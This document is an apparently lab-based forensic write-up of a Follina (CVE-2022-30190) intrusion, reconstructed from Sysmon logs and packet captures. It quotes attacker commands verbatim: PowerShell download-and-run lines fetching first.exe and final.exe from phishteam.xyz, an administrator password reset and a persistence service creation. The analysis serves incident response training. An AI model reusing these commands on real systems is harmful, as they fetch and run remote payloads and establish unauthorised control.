---
{"dg-publish":true,"permalink":"/full-attack-chain-analysis/"}
---

[[]]
### Case Description
---
A user downloaded a malicious document from Google chrome (**chrome.exe**) and the malicious document executed a series of commands to get code execution.
## Tools
---
- **EvtxEcmd** - Parse Windos Event logs into CSV, JSON, XML.
- **Timeline Explorer** - A data filtering and logs navigator using Graphical User Interface (GUI).
- **SysmonView** - A Windows GUI-based tools to visualise Sysmon logs.
- **EventViewer**
- **Wireshark**
- **Brim**
### Preparation
---
#### Parsing Windows Event Logs and feeding it into Timeline Explorer
Command used:
```Powershell
.\EvtxECmd.exe -f 'C:\Users\user\Desktop\Incident Files\sysmon.evtx' --csv 'C:\Users\user\Desktop\Incident Files' --csvf sysmon.csv
```

Output:

![Pasted image 20240917191931.png](/img/user/images/Pasted%20image%2020240917191931.png)
#### At Timeline Explorer

![Pasted image 20240917192141.png](/img/user/images/Pasted%20image%2020240917192141.png)
# Analysis

In the Event Logs the user **benimaru** downloaded **free_magicules.doc** from a website **phishteam.xyz**:

![Pasted image 20240917200130.png](/img/user/images/Pasted%20image%2020240917200130.png)
We can confirm this using the `.pcap` with Wireshark and the IP address of the malicious domain is **162.71.199.91**:

![Pasted image 20240917200214.png](/img/user/images/Pasted%20image%2020240917200214.png)
##### Event ID 1: Process Creation
---
In the timeline viewer using Event ID 1 for process creation and the name of downloaded `.doc` as filter shows the PID of the malicious document is 496.

- Filtering for ParentProcessID 496 found a base64 encoded string:

![Pasted image 20240917205356.png](/img/user/images/Pasted%20image%2020240917205356.png)
##### Base64 Decoding
---
The file is downloaded and written to user benimaru's startup folder, indicating persistence mechanism:
![Pasted image 20240917205643.png](/img/user/images/Pasted%20image%2020240917205643.png)
Since we are not analyzing with the compromised machine we can export the object using Wireshark, after opening up **update.zip** and viewing the strings it contains another request to the same domain but this time downloading `first.exe`:
- `explorer.exe` will execute the file at startup or as user logs on:

```bash
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe 
```

![Pasted image 20240917210458.png](/img/user/images/Pasted%20image%2020240917210458.png)
#### CVE-2022-30190
---
Based on the evidence and the attacker specifically using the `msdt.exe` as the embedded malicious code in the Word document rather than most common payloads - it made me think that at the time of exploitation `msdt.exe` must have a vulnerability.

![Pasted image 20240918212318.png](/img/user/images/Pasted%20image%2020240918212318.png)
- Further research suggest CVE-2022-30190 which make uses of the Microsoft Support Diagnostic Tool (MSDT) to execute malicious crafted URL payloads embedded into Word documents.
- This effectively bypass macros restriction since by default macros are disabled and no further user action needed aside from opening the document.
##### First.exe Analysis
---
Filtering for parent process `first.exe` revealed the following:

![Pasted image 20240918153112.png](/img/user/images/Pasted%20image%2020240918153112.png)
- A reverse proxy to access internal services hosted in the machine with a Process ID of 7388.
	- The file is flagged in VirusTotal even defenders - it is a tool use to quickly create a TCP/UDP tunnel transported via HTTP, secured by SSH effectivley bypassing firewalls.

##### C2 Server Activity
---
Filtering for Process ID 8948 which is the `first.exe` binary with Event ID 3 for network connections shows most likely the C2 of the threat actor:

![Pasted image 20240918154810.png](/img/user/images/Pasted%20image%2020240918154810.png)
###### WireShark Analysis
---
Using the above IP address with Wireshark filter `ip.dst_host == <IP>` shows:
- Commands receives from resolved IP address: **resolvcyber.xyz**
- **/9ab62b5** is the specific URL to get commands to be executed.
- It uses base64 encoding to receive information and **q** as the parameter.
- Based on the user agent the programming language used by the threat actor is **NIM**.

![Pasted image 20240918154929.png](/img/user/images/Pasted%20image%2020240918154929.png)
### Command Decoding Using PowerShell
---
Using brim with the following filter to fully understand what is the attacker executing and then exporting the filtered data to `.json` to automate the decoding:

```bash
_path=="http" "resolvecyber.xyz" id.resp_p==80 | cut ts, host, id.resp_p, uri | sort ts
```

Command output:

![Pasted image 20240918165433.png](/img/user/images/Pasted%20image%2020240918165433.png)
The script used to automate the decoding of base64 encoded strings:

```Powershell
# Path to the JSON file
$filepath = ".\results-b64.json"
$jsonData = Get-Content -Path $filepath | ConvertFrom-Json

foreach ($entry in $jsonData) {
    # Extract the URI field
    $uri = $entry.uri

    # Remove '/9ab62b5?q=' and get the Base64 encoded part only.
    $encodedValue = $uri -replace '.*9ab62b5\?q=', ''

    # Decode the Base64 encoded string.
    try {
        $decodedValue = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedValue))
        
        Write-Output "Decoded value: $decodedValue"
    }
    catch {
        Write-Output "Error"
    }
}
```

Results into the command executed by the command and control:

![Pasted image 20240918172126.png](/img/user/images/Pasted%20image%2020240918172126.png)
**Most notable decoded commands are**:
- **Plaintext password found by threat actor**: 'infernotempest' 
- ##### is open and listening (WindowsRM)

**At Timeline Explorer**:
Filtering for user 'tempest\\benimaru' and looking at the paylods, we can see right after the **ch.exe** there is another downloaded binary name **spf.exe** and **final.exe (PID 3712)**:

![Pasted image 20240918190557.png](/img/user/images/Pasted%20image%2020240918190557.png)
##### spf.exe and Privilege Escalation
---
Using the hash of **spf.exe**  inputted in VirusTotal resulted into `PrintSpoofer.exe`, it is an exploit that takes advantage of `SeImpersonatePrivilege` to give the current user from low privilege to SYSTEM privilege.

Further analysis suggest that it looks like **spf.exe (PID 6828)** is responsible for downloading **final.exe**:
![Pasted image 20240918191755.png](/img/user/images/Pasted%20image%2020240918191755.png)
##### final.exe Analysis
---
 Using the PID 3712 as filter in Timeline Explorer shows a parent process **wsmprovhost.exe** which is for Windows Remote Management executing a payload:
 
```bash
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" iwr http://phishteam.xyz/02dcf07/final.exe -outfile C:\ProgramData\final.exe
```

###### DNS Query Analysis
---
**final.exe** connects to the same domain name by filtering for Event ID 22 for DNS queries using the binary name:

![Pasted image 20240918195317.png](/img/user/images/Pasted%20image%2020240918195317.png)
It connects to a different port using Wireshark we can use the IP address of `resolvecyber.xyz` and scroll down to find out the second port which is port **8080**:

![Pasted image 20240918201055.png](/img/user/images/Pasted%20image%2020240918201055.png)

We can use the same brim filter but replacing the port with 8080 to check all new commands sent from c2 and then exporting it and feeding it to the same powershell command:

```bash
_path=="http" "<replace domain>" id.resp_p==<replace port> | cut ts, host, id.resp_p, uri | sort ts
```

Command output:

![Pasted image 20240918202531.png](/img/user/images/Pasted%20image%2020240918202531.png)
**Interesting commands:**
- Two users created shuna and shion
- Attacker added shion as part of the local group administrators.
![Pasted image 20240918203541.png](/img/user/images/Pasted%20image%2020240918203541.png)
 - "C:\Windows\system32\net.exe" user Administrator ch4ng3dpassword!
 - "C:\Windows\system32\sc.exe" \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto
